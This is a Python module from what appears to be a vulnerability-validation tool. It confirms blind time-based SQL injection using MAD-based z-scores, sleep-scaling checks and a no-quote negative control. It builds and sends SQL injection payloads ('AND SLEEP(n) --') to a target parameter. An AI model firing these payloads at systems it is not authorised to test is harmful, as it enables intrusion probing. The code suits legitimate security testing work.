"""
The timing oracle -- blind time-based injection, made robust.

A single slow response means nothing (jitter, GC, a cold cache). Two ideas make
this sound:

  1. MAD-ROBUST MODIFIED Z-SCORE. Compare the MEDIAN of k sleep-payload samples
     to the median of k baseline samples, scaled by the baseline's Median
     Absolute Deviation:

         z = 0.6745 * (median_test - median_base) / MAD_base

     Median and MAD, not mean and stdev, because one outlier destroys a mean.
     The 0.6745 makes MAD a consistent estimator of sigma on normal data. Gate
     at z > 3.5 (the standard Iglewicz-Hoaglin outlier flag).

  2. SCALING, not a threshold. z > 3.5 only says "slower than baseline noise".
     Causation is established by the delay SCALING with the requested sleep:
     SLEEP(d1) then SLEEP(d2), and (delay_d2 / delay_d1) ~ (d2 / d1). A
     coincidentally slow endpoint does not double on command; a WAF tarpit that
     adds a constant delay fails this and is reported inconclusive, not
     validated.

  3. NEGATIVE CONTROL. The same sleep WITHOUT the quote that breaks out of the
     string must NOT add delay. If it does, the delay is not our injection.

HONESTY. z > 3.5 is NOT "99.9% certain": it flags a value outside baseline
jitter. The SCALING check is what establishes causation, and we say so. Timing
proves injection, not extraction, so it claims no observed grant and is a
distinct failure-mode family ('time') from the differential oracle ('content')
-- which is exactly why the two corroborate.

PRODUCTION NOTE. Each measurement holds the per-target timing mutex
(limiter.timing_lock) so concurrent probes cannot exhaust the connection pool
and poison the median. The mock is single-threaded, so sampling here is already
serial; the mutex is the primitive that guarantees it under real concurrency.
"""
from __future__ import annotations

import statistics
from dataclasses import dataclass, field

from ..http import Fetcher, Request
from ..writer import Candidate, OracleOutcome, Verdict, fingerprint

Z_GATE = 3.5
SCALE_REL_TOL = 0.4       # observed ratio must be within 40% of expected d2/d1
_EPS = 0.5               # ms floor for MAD to avoid divide-by-zero


def _req(endpoint, param, value):
    return Request(method="GET", url=endpoint, params=((param, value),))


def _mad(xs, med):
    return statistics.median([abs(x - med) for x in xs]) if xs else 0.0


@dataclass
class TimingResult:
    verdict: Verdict
    z: float = 0.0
    scale_ratio: float = 0.0
    reason: str = ""
    samples: dict = field(default_factory=dict)


def run_timing_differential(
        fetch: Fetcher, *, asset_id: str, endpoint: str, param: str,
        base_value: str = "test", vuln_class: str = "sqli",
        cvss_vector: str | None = None, cve: str | None = None,
        delays: tuple[int, int] = (2, 4), samples: int = 5) -> TimingResult:

    candidate = Candidate(asset_id=asset_id, vuln_class=vuln_class,
                          endpoint=endpoint, param=param, method="GET",
                          cvss_vector=cvss_vector, cve=cve,
                          root_cause="unparameterised_query")
    ev = "timing::" + fingerprint(candidate)
    d1, d2 = delays

    def measure(value):
        return [fetch(_req(endpoint, param, value)).elapsed_ms
                for _ in range(samples)]

    base = measure(base_value)
    t1 = measure(f"{base_value}' AND SLEEP({d1}) -- ")
    t2 = measure(f"{base_value}' AND SLEEP({d2}) -- ")
    ctrl = measure(f"{base_value} AND SLEEP({d2})")          # no break-out

    med_base = statistics.median(base)
    mad_base = max(_mad(base, med_base), _EPS)
    med1, med2, med_ctrl = map(statistics.median, (t1, t2, ctrl))

    z2 = 0.6745 * (med2 - med_base) / mad_base
    z_ctrl = 0.6745 * (med_ctrl - med_base) / mad_base
    delta1, delta2 = med1 - med_base, med2 - med_base
    ratio = delta2 / delta1 if delta1 > _EPS else 0.0
    expected = d2 / d1
    scaling_ok = abs(ratio - expected) <= SCALE_REL_TOL * expected

    samples_d = {"median_base_ms": round(med_base, 1),
                 "mad_base_ms": round(mad_base, 2),
                 f"median_sleep{d1}_ms": round(med1, 1),
                 f"median_sleep{d2}_ms": round(med2, 1),
                 "z": round(z2, 1), "scale_ratio": round(ratio, 2),
                 "expected_ratio": expected}

    def build(status, conf, fired, reason):
        outcome = OracleOutcome(oracle="timing", fired=fired,
                                effect=round(z2, 2), detail=reason,
                                artifacts=(f"{ev}#base", f"{ev}#sleep{d1}",
                                           f"{ev}#sleep{d2}", f"{ev}#control"))
        v = Verdict(candidate=candidate, status=status, confidence=conf,
                    outcomes=(outcome,), evidence_id=ev)
        return TimingResult(verdict=v, z=round(z2, 2), scale_ratio=round(ratio, 2),
                            reason=reason, samples=samples_d)

    if z2 <= Z_GATE:
        return build("false_positive", 0.10, False,
                     f"no timing signal (z={z2:.1f} <= {Z_GATE}); the endpoint "
                     f"does not respond to the injected sleep")
    if z_ctrl > Z_GATE:
        return build("inconclusive", 0.40, False,
                     f"the delay reproduces WITHOUT breaking the query "
                     f"(control z={z_ctrl:.1f}); confounded, not proven injection")
    if not scaling_ok:
        return build("inconclusive", 0.40, False,
                     f"delay present (z={z2:.1f}) but it does not scale with the "
                     f"requested sleep (ratio {ratio:.1f}, expected {expected:.1f}); "
                     f"a constant tarpit/WAF delay, not a conditional sleep")
    closeness = 1.0 - min(1.0, abs(ratio - expected) / expected)
    conf = round(min(0.90, 0.65 + 0.25 * closeness), 4)     # single-channel cap
    return build("validated", conf, True,
                 f"delay scales with the injected sleep (z={z2:.1f}, ratio "
                 f"{ratio:.1f}~{expected:.1f}) and the no-quote control stays "
                 f"flat: a real conditional sleep")
